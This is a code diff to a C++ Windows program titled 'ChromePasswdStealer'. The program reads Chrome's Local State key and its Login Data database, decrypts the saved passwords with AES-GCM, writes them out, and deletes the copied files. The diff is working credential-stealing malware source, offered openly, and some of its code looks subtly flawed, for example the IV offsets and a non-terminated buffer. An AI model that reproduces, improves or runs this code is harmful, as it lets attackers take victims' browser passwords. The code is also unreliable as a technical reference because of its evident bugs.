@@ -20,28 +20,32 @@ string key;
 string iv;
 string decrypt_password(char* password,int length) {
     if (length < 16) return "";
-
     string ciphertext(password, length);
-    iv = ciphertext.substr(3, 15);
+    iv = ciphertext.substr(3, 12);
     ciphertext = ciphertext.substr(15);
 
     EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
     EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IVLEN, 12, nullptr);
     EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, (const unsigned char*)key.c_str(), (const unsigned char*)iv.c_str());
-
-    char outbuf[512] = {0};
+    
+    auto_ptr<char> outbuf(new char[ciphertext.length()]);
     int outlen;
-    EVP_DecryptUpdate(ctx, (unsigned char*)outbuf, &outlen, (const unsigned char*)ciphertext.c_str(), ciphertext.size());
+    EVP_DecryptUpdate(ctx, (unsigned char*)outbuf.get(), &outlen, (const unsigned char*)ciphertext.c_str(), ciphertext.size());
 
     EVP_CIPHER_CTX_free(ctx);
 
-    ZeroMemory(outbuf + outlen - 16, 16);
+    if (outlen >= 16) {
+        ZeroMemory(outbuf.get() + outlen - 16, 16);
+    }
+    else {
+        return "";
+    }
 
-    return outbuf;
+    return outbuf.get();
 }
 
-string getKey(const char* path) {
-    ifstream f(path);
+string getKey() {
+    ifstream f("Local State");
     string bin_key = base64_decode(nlohmann::json::parse(f)["os_crypt"]["encrypted_key"]);
     f.close();
     
@@ -63,8 +67,7 @@ string getKey(const char* path) {
 }
 
 int main() {
-    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
-    SetConsoleTitleA("ChromePasswdStealer");
+    SetConsoleTitleW(L"ChromePasswdStealer");
     //获取路径
     char szPath[MAX_PATH];
     SHGetFolderPathA(0, CSIDL_LOCAL_APPDATA, 0, 0, szPath);
@@ -82,7 +85,7 @@ int main() {
     auto start = std::chrono::high_resolution_clock::now();
 
     //获取AES key
-    key = getKey("Local State");
+    key = getKey();
 
     //读取Login Data
     sqlite3* db = NULL;
@@ -126,14 +129,12 @@ int main() {
     sqlite3_finalize(stmt);
     sqlite3_close(db);
 
-    DeleteFileA("Local State");
-    DeleteFileA("Login Data");
+    DeleteFileW(L"Local State");
+    DeleteFileW(L"Login Data");
 
     auto end = std::chrono::high_resolution_clock::now();
 
     std::cout << "Total: " << i << "\nTime taken : " << std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count() << " ms\n";
-    fout << "Total: " << i << "\nTime taken : " << std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count() << " ms\n";
     fout.close();
-
     std::system("pause");
 }
